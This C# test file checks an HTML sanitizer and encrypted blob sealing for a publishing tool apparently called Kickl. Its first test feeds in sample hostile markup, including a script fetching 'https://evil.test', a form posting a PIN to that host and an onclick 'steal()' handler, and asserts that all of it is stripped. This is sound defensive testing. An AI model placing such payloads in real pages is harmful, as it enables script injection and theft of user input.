using System.Security.Cryptography;
using Kickl.Core.Crypto;
using Kickl.Core.Documents;
using Kickl.Core.Markup;
using Kickl.Core.Util;

namespace Kickl.Core.Tests;

public class InlineHtmlTests
{
    [Fact]
    public void ScriptsFormsAndRemoteResourcesNeverReachTheRenderer()
    {
        const string html = """
            <html><head><title>x</title><link href="https://evil.test/x.css" rel="stylesheet"/></head>
            <body>
              <div onclick="steal()">hello</div>
              <script>fetch('https://evil.test')</script>
              <form action="https://evil.test"><input name="pin"/></form>
              <img src="https://evil.test/a.png" alt="remote picture"/>
              <a href="jttp://elsewhere/">link text</a>
            </body></html>
            """;

        var safe = InlineHtml.Sanitize(html);

        Assert.DoesNotContain("script", safe, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("onclick", safe, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("https://", safe, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<form", safe, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<input", safe, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("jttp://", safe, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("hello", safe);
        Assert.Contains("remote picture", safe);
        Assert.Contains("link text", safe);
    }

    [Fact]
    public void InlineSvgGradientsAndTextSurviveButEventHandlersDoNot()
    {
        const string html = """
            <center><div>
              <svg xmlns="http://www.w3.org/2000/svg" width="200" height="80" viewBox="0 0 200 80">
                <defs><linearGradient id="g"><stop offset="0%" stop-color="#78c8c8"/></linearGradient></defs>
                <rect width="200" height="80" fill="url(#g)" onclick="bad()"/>
                <text x="10" y="40" fill="#071016">inline</text>
              </svg>
            </div></center>
            """;

        var safe = InlineHtml.Sanitize(html);

        Assert.Contains("<svg", safe);
        Assert.Contains("linearGradient", safe);
        Assert.Contains("url(#g)", safe);
        Assert.Contains("inline", safe);
        Assert.DoesNotContain("onclick", safe, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("xmlns=\"http://www.w3.org/2000/svg\"", safe);
    }

    [Fact]
    public void KmlCarriesASanitizedHtmlVisualBlock()
    {
        const string markup = """
            <kml v="1" site="visual.custom" epoch="1">
              <head><title>Visual</title><meta name="headline" content="Inline visual"/><meta name="tags" content="svg, visual"/></head>
              <body><page><h1>Visual</h1><html><![CDATA[
                <div><svg xmlns="http://www.w3.org/2000/svg" width="40" height="40"><circle cx="20" cy="20" r="18" fill="#78c8c8"/></svg></div>
                <script>alert(1)</script>
              ]]></html></page></body>
            </kml>
            """;

        var page = Kml.Parse(markup, "visual.custom");
        var block = Assert.Single(page.Blocks, b => b.Kind == BlockKind.Html);
        Assert.Contains("<svg", block.Html);
        Assert.DoesNotContain("script", block.Html, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void CustomPagePublishesInlineHtmlInTheSealedPackage()
    {
        using var temp = new TempDir();
        var paths = new DataPaths(temp.Path);
        Keystore.Create(paths, "pin");
        var master = Keystore.Unlock(paths, "pin");
        try
        {
            var doc = SiteComposer.Publish(paths, new StoryDraft
            {
                Host = "visual.custom",
                Headline = "A drawing instead of a stylesheet",
                Author = "Ada",
                Html = "<div><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"120\" height=\"40\"><rect width=\"120\" height=\"40\" fill=\"#ff7a64\"/></svg></div>",
                Tags = ["visual"]
            }, master);

            var page = Kml.Parse(doc.Markup, "visual.custom");
            var html = Assert.Single(page.Blocks, b => b.Kind == BlockKind.Html);
            Assert.Contains("<rect", html.Html);
            Assert.DoesNotContain("stylesheet", html.Html, StringComparison.OrdinalIgnoreCase);
        }
        finally
        {
            CryptographicOperations.ZeroMemory(master);
        }
    }

    [Fact]
    public void RssStoriesRejectInlineHtml()
    {
        using var temp = new TempDir();
        var paths = new DataPaths(temp.Path);
        var master = RandomNumberGenerator.GetBytes(32);

        Assert.Throws<KmlException>(() => SiteComposer.Publish(paths, new StoryDraft
        {
            Host = "visual.rss",
            Headline = "A feed story",
            Body = "The story text.",
            Html = "<div><svg xmlns=\"http://www.w3.org/2000/svg\"><rect width=\"10\" height=\"10\"/></svg></div>"
        }, master));
    }

    [Fact]
    public void RssKmlCannotCarryAnInlineVisual()
    {
        const string markup = """
            <kml v="1" site="visual.rss" epoch="1">
              <head><title>Visual</title><meta name="headline" content="Inline visual"/><meta name="tags" content="rss"/></head>
              <body><page><h1>Visual</h1><html><![CDATA[<div><svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg></div>]]></html></page></body>
            </kml>
            """;

        Assert.Throws<KmlException>(() => Kml.Parse(markup, "visual.rss"));
    }

    [Fact]
    public void SealedReferencesSurviveTheSanitizer()
    {
        const string html = """
            <div><img src="kickl-blob:abc123" alt="sealed"/>
              <svg xmlns="http://www.w3.org/2000/svg"><image href="kickl-blob:def456" width="10" height="10"/></svg>
            </div>
            """;

        var safe = InlineHtml.Sanitize(html);

        Assert.Contains("kickl-blob:abc123", safe);
        Assert.Contains("kickl-blob:def456", safe);
    }

    [Fact]
    public void DataImagesAreExtractedAndRewrittenToBlobReferences()
    {
        var bytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
        var data = "data:image/png;base64," + Convert.ToBase64String(bytes);
        var html = $"<div><img src=\"{data}\"/><svg xmlns=\"http://www.w3.org/2000/svg\"><image href=\"{data}\" width=\"4\" height=\"4\"/></svg></div>";

        var (rewritten, images) = InlineHtml.ExtractDataImages(InlineHtml.Sanitize(html));

        var image = Assert.Single(images);
        Assert.Equal("image/png", image.Mime);
        Assert.Equal(bytes, image.Bytes);
        Assert.Contains("kickl-blob:" + image.Id, rewritten);
        Assert.DoesNotContain("data:image", rewritten, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void InlineImagesAreSealedIntoTheDocumentAndUnlockToTheOriginalBytes()
    {
        using var temp = new TempDir();
        var paths = new DataPaths(temp.Path);
        Keystore.Create(paths, "pin");
        var master = Keystore.Unlock(paths, "pin");
        try
        {
            var bytes = new byte[] { 137, 80, 78, 71, 9, 8, 7, 6 };
            var data = "data:image/png;base64," + Convert.ToBase64String(bytes);
            var html = $"<div><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"40\" height=\"40\"><image href=\"{data}\" width=\"40\" height=\"40\"/></svg></div>";

            var doc = SiteComposer.Publish(paths, new StoryDraft
            {
                Host = "sealed.custom",
                Headline = "Sealed inline image",
                Html = html,
                Tags = ["art"]
            }, master);

            Assert.DoesNotContain("data:image", doc.Markup, StringComparison.OrdinalIgnoreCase);
            Assert.Contains("kickl-blob:", doc.Markup);

            var id = Assert.Single(doc.Blobs.Keys);
            var blob = doc.Blobs[id];
            var docKey = Aead.Open(master, doc.DocKey.Nonce, doc.DocKey.Ciphertext,
                System.Text.Encoding.UTF8.GetBytes("kickl/v1/doc-key|sealed.custom"));
            try
            {
                var plain = Aead.Open(docKey, blob.Nonce, blob.Ciphertext,
                    System.Text.Encoding.UTF8.GetBytes($"kickl/v1/blob|sealed.custom|{id}"));
                try
                {
                    Assert.Equal(bytes, plain);
                }
                finally
                {
                    CryptographicOperations.ZeroMemory(plain);
                }
            }
            finally
            {
                CryptographicOperations.ZeroMemory(docKey);
            }
        }
        finally
        {
            CryptographicOperations.ZeroMemory(master);
        }
    }

    [Fact]
    public void CustomPageCanBeInlineHtmlOnly()
    {
        using var temp = new TempDir();
        var paths = new DataPaths(temp.Path);
        Keystore.Create(paths, "pin");
        var master = Keystore.Unlock(paths, "pin");
        try
        {
            var doc = SiteComposer.Publish(paths, new StoryDraft
            {
                Host = "page.custom",
                Headline = "A free page",
                Html = "<div><h1>free page</h1><p>No story template.</p></div>",
                Tags = ["free"]
            }, master);

            var page = Kml.Parse(doc.Markup, "page.custom");
            var html = Assert.Single(page.Blocks, b => b.Kind == BlockKind.Html);
            Assert.Contains("free page", html.Html);
            Assert.DoesNotContain("feed story", doc.Markup);
        }
        finally
        {
            CryptographicOperations.ZeroMemory(master);
        }
    }
}
